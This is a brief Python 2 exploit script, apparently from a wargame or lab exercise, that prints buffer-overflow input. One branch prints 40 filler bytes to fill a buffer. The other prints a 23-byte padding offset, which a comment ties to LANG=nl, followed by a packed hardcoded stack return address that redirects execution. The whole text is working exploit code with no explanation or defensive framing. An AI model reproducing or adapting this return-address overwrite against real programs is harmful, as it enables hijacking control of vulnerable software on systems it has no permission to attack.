import struct
import sys

if len(sys.argv) == 1:
    print "A" * 40 # Fill the first 40 bytes buffer
else:
    payload = "B" * 23 # Offset with LANG=nl
    payload += struct.pack("I", 0xbffff8ac)
    print payload